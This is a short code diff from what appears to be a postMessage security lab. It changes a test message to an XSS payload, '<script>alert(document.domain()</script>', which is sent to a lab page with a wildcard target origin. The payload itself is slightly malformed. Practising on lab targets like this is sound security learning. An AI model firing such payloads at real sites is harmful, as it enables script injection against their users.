@@ -13,7 +13,7 @@
         myWindow = window.open("https://ac13.netlify.app/postmsg_lab");
 
         function postMsg() {
-            myWindow.postMessage("achabi test", "*");
+            myWindow.postMessage("<script>alert(document.domain()</script>", "*");
         }
 
         setTimeout(postMsg, 3000);
